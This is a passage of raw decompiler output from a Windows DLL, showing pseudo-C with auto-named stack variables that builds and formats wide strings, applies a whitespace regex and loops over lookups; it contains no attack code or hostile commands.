(***puVar14)(puVar14, 1);\n    }\n    puStack1736 = NULL;\n    fcn.180010540(auStack1728);\n    fcn.1800131f0(&puStack1736, 0x1800f6170, 0x1800f618e);\n    uStack1864 = *0x180101900;\n    uStack1860 = *0x180101904;\n    uStack1856 = *0x180101908;\n    uStack1852 = *0x18010190c;\n    uStack1880 = uStack1880._2_2_ << 0x10;\n    uStack2248 = 0x1cc;\n    iStack552 = CONCAT44(*0x180101904, *0x180101900);\n    uStack544 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack568._0_2_ = 0;\n    fcn.180010d70(&uStack568, 0x1800f5b3c, 0);\n    puVar23 = &uStack664;\n    bVar28 = 7 < CONCAT44(uStack636, uStack640);\n    if (bVar28) {\n        puVar23 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n    }\n    puVar17 = &uStack664;\n    if (bVar28) {\n        puVar17 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n    }\n    puStack2272 = &uStack568;\n    ppuStack2280 = &puStack1736;\n    fcn.180015730(auStack2040, &uStack1880, puVar17, puVar23 + CONCAT44(uStack644, uStack648));\n    if (7 < uStack544) {\n        iVar22 = CONCAT44(uStack568._4_4_, CONCAT22(uStack568._2_2_, uStack568));\n        iVar24 = iVar22;\n        if ((0xfff < uStack544 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n        goto code_r0x000180027647;\n        fcn.18008fb24(iVar24);\n    }\n    if (7 < CONCAT44(uStack636, uStack640)) {\n        iVar24 = CONCAT44(uStack636, uStack640) * 2;\n        iVar21 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n        iVar22 = iVar21;\n        if (0xfff < iVar24 + 2U) {\n            iVar22 = *(iVar21 + -8);\n            if (0x1f < (iVar21 - iVar22) - 8U) {\n                fcn.1800b3528(iVar22, iVar24 + 0x29);\n                goto code_r0x000180027653;\n            }\n        }\n        fcn.18008fb24(iVar22);\n    }\n    uStack636 = uStack1852;\n    uStack640 = uStack1856;\n    uStack644 = uStack1860;\n    uStack648 = uStack1864;\n    uVar10 = *0x18010190c;\n    uVar9 = *0x180101908;\n    uVar8 = *0x180101904;\n    uVar6 = *0x180101900;\n    uStack664._0_2_ = uStack1880;\n    uStack664._2_2_ = uStack1880 >> 0x10;\n    uStack664._4_4_ = uStack1876;\n    uStack656 = uStack1872;\n    uStack652 = uStack1868;\n    uStack1864 = *0x180101900;\n    uStack1860 = *0x180101904;\n    uStack1856 = *0x180101908;\n    uStack1852 = *0x18010190c;\n    uStack1880 = uStack664._2_2_ << 0x10;\n    iVar24 = -1;\n    if (puStack1736 != NULL) {\n        LOCK();\n        piVar1 = puStack1736 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        puVar14 = puStack1736;\n        if (iVar2 == 1) {\n            while (puVar14 != NULL) {\n                puVar4 = puVar14[2];\n                puVar14[2] = 0;\n                (***puVar14)(puVar14, 1);\n                puVar14 = puVar4;\n            }\n        }\n    }\n    puStack1736 = NULL;\n    if ((piStack1704 != NULL) && (puVar14 = (**(*piStack1704 + 0x10))(),  puVar14 != NULL)) {\n        (***puVar14)(puVar14, 1);\n    }\n    puStack1776 = NULL;\n    fcn.180010540(auStack1768);\n    fcn.1800131f0(&puStack1776, L\"( ){2,}\", 0x1800f619e);\n    uStack1832 = *0x180101900;\n    uStack1828 = *0x180101904;\n    uStack1824 = *0x180101908;\n    uStack1820 = *0x18010190c;\n    uStack1848 = uStack1848._2_2_ << 0x10;\n    uStack2248 = 0x2cc;\n    uStack328 = *0x180101900;\n    uStack324 = *0x180101904;\n    uStack320 = *0x180101908;\n    uStack316 = *0x18010190c;\n    uStack344 = 0;\n    fcn.180010d70(&uStack344, 0x1800f5b5c, 1);\n    puVar23 = &uStack664;\n    bVar28 = 7 < CONCAT44(uStack636, uStack640);\n    if (bVar28) {\n        puVar23 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n    }\n    puVar17 = &uStack664;\n    if (bVar28) {\n        puVar17 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n    }\n    puStack2272 = &uStack344;\n    ppuStack2280 = &puStack1776;\n    fcn.180015730(auStack1568, &uStack1848, puVar17, puVar23 + CONCAT44(uStack644, uStack648));\n    if (7 < CONCAT44(uStack316, uStack320)) {\n        iVar21 = CONCAT62(Stack342, uStack344);\n        iVar22 = iVar21;\n        if ((0xfff < CONCAT44(uStack316, uStack320) * 2 + 2) &&\n           (iVar22 = *(iVar21 + -8),  0x1f < (iVar21 - iVar22) - 8U)) {\ncode_r0x000180027653:\n            fcn.1800b3528();\n            pcVar5 = swi(3);\n            (*pcVar5)();\n            return;\n        }\n        fcn.18008fb24(iVar22);\n    }\n    if (7 < CONCAT44(uStack636, uStack640)) {\n        iVar22 = CONCAT44(uStack636, uStack640) * 2;\n        iVar7 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n        iVar21 = iVar7;\n        if (0xfff < iVar22 + 2U) {\n            iVar21 = *(iVar7 + -8);\n            if (0x1f < (iVar7 - iVar21) - 8U) {\n                fcn.1800b3528(iVar21, iVar22 + 0x29);\n                goto code_r0x00018002765f;\n            }\n        }\n        fcn.18008fb24(iVar21);\n    }\n    uStack636 = uStack1820;\n    uStack640 = uStack1824;\n    uStack644 = uStack1828;\n    uStack648 = uStack1832;\n    uVar10 = *0x18010190c;\n    uVar9 = *0x180101908;\n    uVar8 = *0x180101904;\n    uVar6 = *0x180101900;\n    uStack664._0_2_ = uStack1848;\n    uStack664._2_2_ = uStack1848 >> 0x10;\n    uStack664._4_4_ = uStack1844;\n    uStack656 = uStack1840;\n    uStack652 = uStack1836;\n    uStack1832 = *0x180101900;\n    uStack1828 = *0x180101904;\n    uStack1824 = *0x180101908;\n    uStack1820 = *0x18010190c;\n    uStack1848 = uStack664._2_2_ << 0x10;\n    if (puStack1776 != NULL) {\n        LOCK();\n        piVar1 = puStack1776 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        puVar14 = puStack1776;\n        if (iVar2 == 1) {\n            while (puVar14 != NULL) {\n                puVar4 = puVar14[2];\n                puVar14[2] = 0;\n                (***puVar14)(puVar14, 1);\n                puVar14 = puVar4;\n            }\n        }\n    }\n    puStack1776 = NULL;\n    if ((piStack1744 != NULL) && (puVar14 = (**(*piStack1744 + 0x10))(),  puVar14 != NULL)) {\n        (***puVar14)(puVar14, 1);\n    }\n    puStack1816 = NULL;\n    fcn.180010540(auStack1808);\n    fcn.1800131f0(&puStack1816, 0x1800f5bcc, 0x1800f5bce);\n    uStack1976 = *0x180101900;\n    uStack1972 = *0x180101904;\n    uStack1968 = *0x180101908;\n    uStack1964 = *0x18010190c;\n    uStack1992 = 0;\n    uStack2248 = 0x4cc;\n    uStack360 = *0x180101900;\n    uStack356 = *0x180101904;\n    uStack352 = *0x180101908;\n    uStack348 = *0x18010190c;\n    uStack376 = 0;\n    fcn.180010d70(&uStack376, 0x1800f5bac, 1);\n    puVar23 = &uStack664;\n    bVar28 = 7 < CONCAT44(uStack636, uStack640);\n    if (bVar28) {\n        puVar23 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n    }\n    puVar17 = &uStack664;\n    if (bVar28) {\n        puVar17 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n    }\n    puStack2272 = &uStack376;\n    ppuStack2280 = &puStack1816;\n    fcn.180015730(auStack1576, &uStack1992, puVar17, puVar23 + CONCAT44(uStack644, uStack648));\n    if (7 < CONCAT44(uStack348, uStack352)) {\n        iVar21 = CONCAT62(Stack374, uStack376);\n        iVar22 = iVar21;\n        if ((0xfff < CONCAT44(uStack348, uStack352) * 2 + 2) &&\n           (iVar22 = *(iVar21 + -8),  0x1f < (iVar21 - iVar22) - 8U)) {\ncode_r0x00018002765f:\n            fcn.1800b3528();\n            pcVar5 = swi(3);\n            (*pcVar5)();\n            return;\n        }\n        fcn.18008fb24(iVar22);\n    }\n    uStack1600 = *0x180101900;\n    uStack1596 = *0x180101904;\n    uStack1592 = *0x180101908;\n    uStack1588 = *0x18010190c;\n    uStack1616 = uStack1616._2_2_ << 0x10;\n    uVar13 = 0x32;\n    if (CONCAT44(uStack1972, uStack1976) < 0x32) {\n        uVar13 = CONCAT44(uStack1972, uStack1976);\n    }\n    puVar23 = &uStack1992;\n    if (7 < CONCAT44(uStack1964, uStack1968)) {\n        puVar23 = CONCAT62(Stack1990, uStack1992);\n    }\n    fcn.180010d70(&uStack1616, puVar23, uVar13);\n    if (7 < CONCAT44(uStack636, uStack640)) {\n        iVar22 = CONCAT44(uStack636, uStack640) * 2;\n        iVar7 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n        iVar21 = iVar7;\n        if (0xfff < iVar22 + 2U) {\n            iVar21 = *(iVar7 + -8);\n            if (0x1f < (iVar7 - iVar21) - 8U) {\n                fcn.1800b3528(iVar21, iVar22 + 0x29);\n                goto code_r0x00018002766b;\n            }\n        }\n        fcn.18008fb24(iVar21);\n    }\n    uStack664._0_2_ = uStack1616;\n    uStack664._2_2_ = uStack1616 >> 0x10;\n    uStack664._4_4_ = uStack1612;\n    uStack656 = uStack1608;\n    uStack652 = uStack1604;\n    uStack648 = uStack1600;\n    uStack644 = uStack1596;\n    uStack640 = uStack1592;\n    uStack636 = uStack1588;\n    if (7 < CONCAT44(uStack1964, uStack1968)) {\n        iVar21 = CONCAT62(Stack1990, uStack1992);\n        iVar22 = iVar21;\n        if ((0xfff < CONCAT44(uStack1964, uStack1968) * 2 + 2) &&\n           (iVar22 = *(iVar21 + -8),  0x1f < (iVar21 - iVar22) - 8U)) {\ncode_r0x00018002766b:\n            fcn.1800b3528();\ncode_r0x000180027671:\n            fcn.1800b3528();\ncode_r0x000180027677:\n            fcn.1800b3528();\ncode_r0x00018002767d:\n            fcn.1800b3528();\ncode_r0x000180027683:\n            fcn.1800b3528();\ncode_r0x000180027689:\n            fcn.1800b3528();\ncode_r0x00018002768f:\n            fcn.1800b3528();\ncode_r0x000180027695:\n            fcn.1800b3528();\ncode_r0x00018002769b:\n            fcn.1800b3528();\ncode_r0x0001800276a1:\n            fcn.1800b3528();\ncode_r0x0001800276a7:\n            fcn.1800b3528();\ncode_r0x0001800276ad:\n            fcn.1800b3528();\n            pcVar5 = swi(3);\n            (*pcVar5)();\n            return;\n        }\n        fcn.18008fb24(iVar22);\n    }\n    uStack1964 = *0x18010190c;\n    uStack1968 = *0x180101908;\n    uStack1972 = *0x180101904;\n    uStack1976 = *0x180101900;\n    uStack1992 = 0;\n    if (puStack1816 != NULL) {\n        LOCK();\n        piVar1 = puStack1816 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        puVar14 = puStack1816;\n        if (iVar2 == 1) {\n            while (puVar14 != NULL) {\n                puVar4 = puVar14[2];\n                puVar14[2] = 0;\n                (***puVar14)(puVar14, 1);\n                puVar14 = puVar4;\n            }\n        }\n    }\n    puStack1816 = NULL;\n    if ((piStack1784 != NULL) && (puVar14 = (**(*piStack1784 + 0x10))(),  puVar14 != NULL)) {\n        (***puVar14)(puVar14, 1);\n    }\n    ppuStack2280 = &uStack664;\n    if (7 < CONCAT44(uStack636, uStack640)) {\n        ppuStack2280 = CONCAT44(uStack664._4_4_, CONCAT22(uStack664._2_2_, uStack664));\n    }\n    fcn.180020a90(aiStack200, 0x3c, L\"FT%03d_%s\", arg2 + 1);\n    piStack1952 = fcn.180073b64(1);\n    piVar15 = fcn.180014560(&uStack1960);\n    do {\n        iVar24 = iVar24 + 1;\n    } while (aiStack200[iVar24] != 0);\n    (**(*piVar15 + 0x48))();\n    if ((piStack1952 != NULL) && (puVar14 = (**(*piStack1952 + 0x10))(),  puVar14 != NULL)) {\n        (***puVar14)(puVar14);\n    }\n    uVar27 = 0x8cc;\n    iStack2080 = 0;\n    uVar19 = arg2_01;\n    do {\n        iVar2 = uVar19;\n        auStack2040[0] = iVar2 + 1;\n        uStack1960 = fcn.180020b50(aiStack1928, auStack2040[0]);\n        uStack2192 = 0;\n        uStack2184 = 7;\n        uStack2208._0_1_ = 0;\n        uStack2208._1_1_ = 0;\n        fcn.180010d70(&uStack2208, 0x1800f6208, 0x12);\n        uVar19 = uStack2192;\n        if (uStack2184 == uStack2192) {\n            ppuStack2280 = 0x1;\n            puVar18 = fcn.180013690(&uStack2208, 1, 0, 0x1800f5c2c);\n        }\n        else {\n            uVar25 = uStack2192 + 1;\n            uStack2192 = uVar25;\n            puVar16 = &uStack2208;\n            if (7 < uStack2184) {\n                puVar16 = CONCAT62(uStack2208._2_6_, CONCAT11(uStack2208._1_1_, uStack2208));\n            }\n            *(puVar16 + uVar19 * 2) = 0x20;\n            *(puVar16 + uVar25 * 2) = 0;\n            puVar18 = &uStack2208;\n        }\n        iStack616 = 0;\n        uStack608 = 0;\n        uVar6 = *puVar18;\n        uStack632._0_1_ = uVar6;\n        uStack632._1_1_ = uVar6 >> 8;\n        uStack632._2_2_ = uVar6 >> 0x10;\n        uStack632._4_4_ = puVar18[1];\n        uStack624 = puVar18[2];\n        uStack620 = puVar18[3];\n        iStack616 = *(puVar18 + 4);\n        uStack608 = *(puVar18 + 6);\n        *(puVar18 + 4) = 0;\n        *(puVar18 + 6) = 7;\n        *puVar18 = 0;\n        arg2_00 = arg3[2];\n        puVar14 = arg3;\n        if (7 < arg3[3]) {\n            puVar14 = *arg3;\n        }\n        if (uStack608 - iStack616 < arg2_00) {\n            ppuStack2280 = arg2_00;\n            puVar18 = fcn.180013690(&uStack632, arg2_00, 0, puVar14);\n        }\n        else {\n            iVar24 = iStack616 + arg2_00;\n            puVar16 = &uStack632;\n            if (7 < uStack608) {\n                puVar16 = CONCAT44(uStack632._4_4_, CONCAT22(uStack632._2_2_, CONCAT11(uStack632._1_1_, uStack632)));\n            }\n            iVar22 = iStack616 * 2;\n            iStack616 = iVar24;\n            fcn.1800ade80(puVar16 + iVar22, puVar14, arg2_00 * 2);\n            *(puVar16 + iVar24 * 2) = 0;\n            puVar18 = &uStack632;\n        }\n        iStack584 = 0;\n        uStack576 = 0;\n        uVar6 = *puVar18;\n        uStack600._0_1_ = uVar6;\n        uStack600._1_1_ = uVar6 >> 8;\n        uStack600._2_2_ = uVar6 >> 0x10;\n        uStack600._4_4_ = puVar18[1];\n        uStack592 = puVar18[2];\n        uStack588 = puVar18[3];\n        iStack584 = *(puVar18 + 4);\n        uStack576 = *(puVar18 + 6);\n        *(puVar18 + 4) = 0;\n        *(puVar18 + 6) = 7;\n        *puVar18 = 0;\n        puVar23 = &uStack536;\n        if (7 < uStack512) {\n            puVar23 = CONCAT62(Stack534, uStack536);\n        }\n        if (uStack576 - iStack584 < ppuStack520) {\n            ppuStack2280 = ppuStack520;\n            puVar18 = fcn.180013690(&uStack600, ppuStack520, 0, puVar23);\n        }\n        else {\n            iVar24 = ppuStack520 + iStack584;\n            puVar16 = &uStack600;\n            if (7 < uStack576) {\n                puVar16 = CONCAT44(uStack600._4_4_, CONCAT22(uStack600._2_2_, CONCAT11(uStack600._1_1_, uStack600)));\n            }\n            iVar22 = iStack584 * 2;\n            iStack584 = iVar24;\n            fcn.1800ade80(puVar16 + iVar22, puVar23, ppuStack520 * 2);\n            *(puVar16 + iVar24 * 2) = 0;\n            puVar18 = &uStack600;\n        }\n        iStack552 = 0;\n        uStack544 = 0;\n        uStack568._0_2_ = *puVar18;\n        uStack568._2_2_ = *puVar18 >> 0x10;\n        uStack568._4_4_ = puVar18[1];\n        uStack560 = puVar18[2];\n        uStack556 = puVar18[3];\n        iStack552 = *(puVar18 + 4);\n        uStack544 = *(puVar18 + 6);\n        *(puVar18 + 4) = 0;\n        *(puVar18 + 6) = 7;\n        *puVar18 = 0;\n        if (uStack544 - iStack552 < 0x15) {\n            ppuStack2280 = 0x15;\n            puVar14 = fcn.180013690(&uStack568, 0x15, 0, 0x1800f61d8);\n        }\n        else {\n            iVar24 = iStack552 + 0x15;\n            puVar23 = &uStack568;\n            if (7 < uStack544) {\n                puVar23 = CONCAT44(uStack568._4_4_, CONCAT22(uStack568._2_2_, uStack568));\n            }\n            puVar17 = puVar23 + iStack552;\n            iStack552 = iVar24;\n            fcn.1800ade80(puVar17, 0x1800f61d8, 0x2a);\n            puVar23[iVar24] = 0;\n            puVar14 = &uStack568;\n        }\n        iStack2160 = 0;\n        uStack2152 = 0;\n        puVar23 = *puVar14;\n        uStack2176._0_2_ = *puVar14;\n        uStack2176._2_2_ = *puVar14 >> 0x10;\n        uStack2172 = *(puVar14 + 4);\n        uStack2168 = *(puVar14 + 1);\n        uStack2164 = *(puVar14 + 0xc);\n        iStack2160 = puVar14[2];\n        uStack2152 = puVar14[3];\n        puVar14[2] = 0;\n        puVar14[3] = 7;\n        *puVar14 = 0;\n        if (uStack2152 - iStack2160 < 3) {\n            ppuStack2280 = 0x3;\n            puVar18 = fcn.180013690(&uStack2176, 3, 0, 0x1800f61d0);\n        }\n        else {\n            iVar24 = iStack2160 + 3;\n            puVar17 = &uStack2176;\n            if (7 < uStack2152) {\n                puVar17 = puVar23;\n            }\n            puVar23 = puVar17 + iStack2160;\n            iStack2160 = iVar24;\n            fcn.1800ade80(puVar23, 0x1800f61d0, 6);\n            puVar17[iVar24] = 0;\n            puVar18 = &uStack2176;\n        }\n        iStack2096 = 0;\n        uStack2088 = 0;\n        uStack2112._0_2_ = *puVar18;\n        uStack2112._2_2_ = *puVar18 >> 0x10;\n        uStack2112._4_4_ = puVar18[1];\n        uStack2104 = puVar18[2];\n        uStack2100 = puVar18[3];\n        iStack2096 = *(puVar18 + 4);\n        uStack2088 = *(puVar18 + 6);\n        *(puVar18 + 4) = 0;\n        *(puVar18 + 6) = 7;\n        *puVar18 = 0;\n        if (uStack2088 - iStack2096 < 8) {\n            ppuStack2280 = 0x8;\n            piVar15 = fcn.180013690(&uStack2112, 8, 0, 0x1800f61b8);\n        }\n        else {\n            iVar24 = iStack2096 + 8;\n            puVar23 = &uStack2112;\n            if (7 < uStack2088) {\n                puVar23 = CONCAT44(uStack2112._4_4_, CONCAT22(uStack2112._2_2_, uStack2112));\n            }\n            puVar17 = puVar23 + iStack2096;\n            iStack2096 = iVar24;\n            fcn.1800ade80(puVar17, 0x1800f61b8, 0x10);\n            puVar23[iVar24] = 0;\n            piVar15 = &uStack2112;\n        }\n        uStack2128 = 0;\n        uStack2120 = 0;\n        puVar23 = *piVar15;\n        uStack2144._0_2_ = *piVar15;\n        uStack2144._2_2_ = *piVar15 >> 0x10;\n        uStack2140 = *(piVar15 + 4);\n        uStack2136 = *(piVar15 + 1);\n        uStack2132 = *(piVar15 + 0xc);\n        uVar19 = piVar15[2];\n        uStack2120 = piVar15[3];\n        piVar15[2] = 0;\n        piVar15[3] = 7;\n        *piVar15 = 0;\n        if (uStack2120 == uVar19) {\n            ppuStack2280 = 0x1;\n            uStack2128 = uVar19;\n            puVar18 = fcn.180013690(&uStack2144, 1, 0, 0x1800f5be4);\n        }\n        else {\n            uStack2128 = uVar19 + 1;\n            puVar17 = &uStack2144;\n            if (7 < uStack2120) {\n                puVar17 = puVar23;\n            }\n            puVar17[uVar19] = 0x20;\n            puVar17[uVar19 + 1] = 0;\n            puVar18 = &uStack2144;\n        }\n        uStack2224 = 0;\n        uStack2216 = 0;\n        uVar6 = *puVar18;\n        uStack2240._0_1_ = uVar6;\n        uStack2240._1_1_ = uVar6 >> 8;\n        uStack2240._2_2_ = uVar6 >> 0x10;\n        uStack2236 = puVar18[1];\n        uStack2232 = puVar18[2];\n        uStack2228 = puVar18[3];\n        uStack2224 = *(puVar18 + 4);\n        uStack2216 = *(puVar18 + 6);\n        *(puVar18 + 4) = 0;\n        *(puVar18 + 6) = 7;\n        *puVar18 = 0;\n        uStack2248 = uVar27 | 0x7f000;\n        uVar13 = fcn.18002e490(&uStack2072, &uStack2240, uStack1960);\n        cVar12 = fcn.180067c60(arg3 + iVar2 * 4 + 0x12, *(iStack2032 + 0x18), uVar13);\n        if (7 < uStack2048) {\n            iVar22 = CONCAT62(Stack2070, uStack2072);\n            iVar24 = iVar22;\n            if ((0xfff < uStack2048 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x000180027671;\n            fcn.18008fb24(iVar24);\n        }\n        uStack2056 = 0;\n        uStack2048 = 7;\n        uStack2072 = 0;\n        if (7 < uStack2216) {\n            iVar22 = CONCAT44(uStack2236, CONCAT22(uStack2240._2_2_, CONCAT11(uStack2240._1_1_, uStack2240)));\n            iVar24 = iVar22;\n            if ((0xfff < uStack2216 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x000180027677;\n            fcn.18008fb24(iVar24);\n        }\n        uStack2224 = 0;\n        uStack2216 = 7;\n        uStack2240._0_1_ = 0;\n        uStack2240._1_1_ = 0;\n        if (7 < uStack2120) {\n            iVar22 = CONCAT44(uStack2140, CONCAT22(uStack2144._2_2_, uStack2144));\n            iVar24 = iVar22;\n            if ((0xfff < uStack2120 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x00018002767d;\n            fcn.18008fb24(iVar24);\n        }\n        uStack2128 = 0;\n        uStack2120 = 7;\n        uStack2144._0_2_ = 0;\n        if (7 < uStack2088) {\n            iVar22 = CONCAT44(uStack2112._4_4_, CONCAT22(uStack2112._2_2_, uStack2112));\n            iVar24 = iVar22;\n            if ((0xfff < uStack2088 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x000180027683;\n            fcn.18008fb24(iVar24);\n        }\n        iStack2096 = 0;\n        uStack2088 = 7;\n        uStack2112._0_2_ = 0;\n        if (7 < uStack2152) {\n            iVar22 = CONCAT44(uStack2172, CONCAT22(uStack2176._2_2_, uStack2176));\n            iVar24 = iVar22;\n            if ((0xfff < uStack2152 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x000180027689;\n            fcn.18008fb24(iVar24);\n        }\n        iStack2160 = 0;\n        uStack2152 = 7;\n        uStack2176._0_2_ = 0;\n        if (7 < uStack544) {\n            iVar22 = CONCAT44(uStack568._4_4_, CONCAT22(uStack568._2_2_, uStack568));\n            iVar24 = iVar22;\n            if ((0xfff < uStack544 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x00018002768f;\n            fcn.18008fb24(iVar24);\n        }\n        iStack552 = 0;\n        uStack544 = 7;\n        uStack568._0_2_ = 0;\n        if (7 < uStack576) {\n            iVar22 = CONCAT44(uStack600._4_4_, CONCAT22(uStack600._2_2_, CONCAT11(uStack600._1_1_, uStack600)));\n            iVar24 = iVar22;\n            if ((0xfff < uStack576 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x000180027695;\n            fcn.18008fb24(iVar24);\n        }\n        iStack584 = 0;\n        uStack576 = 7;\n        uStack600._0_1_ = 0;\n        uStack600._1_1_ = 0;\n        if (7 < uStack608) {\n            iVar22 = CONCAT44(uStack632._4_4_, CONCAT22(uStack632._2_2_, CONCAT11(uStack632._1_1_, uStack632)));\n            iVar24 = iVar22;\n            if ((0xfff < uStack608 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x00018002769b;\n            fcn.18008fb24(iVar24);\n        }\n        iStack616 = 0;\n        uStack608 = 7;\n        uStack632._0_1_ = 0;\n        uStack632._1_1_ = 0;\n        if (7 < uStack2184) {\n            iVar22 = CONCAT62(uStack2208._2_6_, CONCAT11(uStack2208._1_1_, uStack2208));\n            iVar24 = iVar22;\n            if ((0xfff < uStack2184 * 2 + 2) && (iVar24 = *(iVar22 + -8),  0x1f < (iVar22 - iVar24) - 8U))\n            goto code_r0x0001800276a1;\n            fcn.18008fb24(iVar24);\n        }\n        uStack2192 = 0;\n        uStack2184 = 7;\n        uStack2208._0_1_ = 0;\n        uStack2208._1_1_ = 0;\n        if (7 < uStack1904) {\n            iVar24 = aiStack1928[0];\n            if ((0xfff < uStack1904 * 2 + 2) &&\n               (iVar24 = *(aiStack1928[0] + -8),  0x1f < (aiStack1928[0] - iVar24) - 8U)) goto code_r0x0001800276a7;\n            fcn.18008fb24(iVar24);\n        }\n        uVar11 = auStack2040[0];\n        if (cVar12 != '\\0') goto code_r0x00018002759c;\n        uVar19 = auStack2040[0];\n        fcn.180020a90(auStack248, 5, 0x1800f6230, uVar19);\n        iVar24 = iStack2080;\n        uVar3 = *(arg3 + iStack2080 * 4 + 0x80);\n        if (uVar3 == 0) {\n            uStack2224 = 0;\n            uStack2216 = 7;\n            uStack2240._0_1_ = 0;\n            uStack2240._1_1_ = 0;\n            fcn.180010d70(&uStack2240, 0x1800f5c5c, 0);\n            puVar18 = &uStack2240;\n            uVar27 = uVar27 | 0x7f001;\n        }\n        else {\n            puVar18 = fcn.180020b50(&uStack2072, uVar3);\n            uVar27 = uVar27 | 0x7f002;\n        }\n        uStack472 = *puVar18;\n        uStack468 = puVar18[1];\n        uStack464 = puVar18[2];\n        uStack460 = puVar18[3];\n        uStack456 = puVar18[4];\n        uStack452 = puVar18[5];\n        uStack448 = puVar18[6];\n        uStack444 = puVar18[7];\n        *(puVar18 + 4) = 0;\n        *(puVar18 + 6) = 7;\n        *puVar18 = 0;\n        if ((uVar27 & 2) != 0) {\n            uVar27 = uVar27 & 0xfffffffd;\n            if (7 < uStack2048) {\n                iVar21 = CONCAT62(Stack2070, uStack2072);\n                iVar22 = iVar21;\n                if ((0xfff < uStack2048 * 2 + 2) && (iVar22 = *(iVar21 + -8),  0x1f < (iVar21 - iVar22) - 8U))\n                goto code_r0x0001800276ad;\n                fcn.18008fb24(iVar22);\n            }\n            uStack2056 = 0;\n            uStack2048 = 7;\n            uStack2072 = 0;\n        }\n        if (((uVar27 & 1) != 0) && (uVar27 = uVar27 & 0xfffffffe,  7 < uStack2216)) {\n            iVar21 = CONCAT44(uStack2236, CONCAT22(uStack2240._2_2_, CONCAT11(uStack2240._1_1_, uStack2240)));\n            iVar22 = iVar21;\n            if (0xfff < uStack2216 * 2 + 2) {\n                iVar22 = *(iVar21 + -8);\n                if (0x1f < (iVar21 - iVar22) - 8U) {\n                    fcn.1800b3528(iVar22, uStack2216 * 2 + 0x29);\n                    goto code_r0x000180027629;\n                }\n            }\n            fcn.18008fb24(iVar22);\n        }\n        uStack2224 = 0;\n        uStack2216 = 7;\n        uStack2240._0_1_ = 0;\n        uStack2240._1_1_ = 0;\n        fcn.180010d50(&uStack2240, auStack248);\n        uVar13 = fcn.18000da30(auStack2024, auStack248);\n        uVar13 = fcn.180013190(&uStack1960, 0x1800f6258, uVar13);\n        uVar13 = fcn.18002e710(&uStack2144, uVar13, 0x1800f5d24);\n        uVar13 = fcn.180020680(&uStack2112, uVar13, &uStack472);\n        uVar13 = fcn.180020680(&uStack2176, uVar13, &uStack536);\n        uVar13 = fcn.18002e710(&uStack568, uVar13, 0x1800f6240);\n        uVar13 = fcn.18002e490(&uStack600, uVar13, &uStack2240);\n        uVar13 = fcn.18002e710(&uStack632, uVar13, 0x1800f5ccc);\n        uVar13 = fcn.180020680(&uStack2208, uVar13, arg3 + iVar2 * 4 + 0x12);\n        uVar13 = fcn.180020680(aiStack1928, uVar13, &uStack536);\n        fcn.18000d8d0(auStack312, uVar13);\n        fcn.180003e40(aiStack1928);\n        fcn.180003e40(&uStack2208);\n        fcn.180003e40(&uStack632);\n        fcn.180003e40(&uStack600);\n        fcn.180003e40(&uStack568);\n        fcn.180003e40(&uStack2176);\n        fcn.180003e40(&uStack2112);\n        fcn.180003e40(&uStack2144);\n        fcn.180003e40(&uStack1960);\n        fcn.180003e40(auStack2024);\n        fcn.180003e40(&uStack2240);\n        fcn.180003e40(&uStack472);\n        iStack2080 = iVar24 + 1;\n    } while (uVar11 < 3);\n    uVar19 = fcn.18002da70(arg3 + 0xd);\n    uVar25 = 999;\n    if ((999 < uVar19) || (uVar25 = fcn.18002da70(arg3 + 0xd),  uVar25 != 0)) {\n        do {\n            iVar24 = fcn.18002da60(arg3 + 0xd, arg2_01);\n            uVar13 = fcn.18000da30(&uStack568, 0x1800f62d8);\n            uVar13 = fcn.18002e710(&uStack600, uVar13, 0x1800f5d7c);\n            uVar13 = fcn.180020680(&uStack632, uVar13, arg3);\n            uVar13 = fcn.180020680(&uStack2208, uVar13, &uStack536);\n            uVar13 = fcn.18002e710(&uStack2240, uVar13, 0x1800f62a8);\n            uVar13 = fcn.18002e710(&uStack2072, uVar13, 0x1800f5d3c);\n            uVar13 = fcn.180020680(&uStack472, uVar13, iVar24);\n            uVar13 = fcn.180020680(aiStack1928, uVar13, &uStack536);\n            uVar13 = fcn.18002e710(auStack2024, uVar13, 0x1800f6270);\n            cVar12 = fcn.180067c60(iVar24 + 0x20, *(iStack2032 + 0x18), uVar13);\n            fcn.180003e40(auStack2024);\n            fcn.180003e40(aiStack1928);\n            fcn.180003e40(&uStack472);\n            fcn.180003e40(&uStack2072);\n            fcn.180003e40(&uStack2240);\n            fcn.180003e40(&uStack2208);\n            fcn.180003e40(&uStack632);\n            fcn.180003e40(&uStack600);\n            fcn.180003e40(&uStack568);\n            if (cVar12 != '\\0') goto code_r0x00018002759c;\n            fcn.180020a90(auStack232, 10, 0x1800f6300, arg2_01 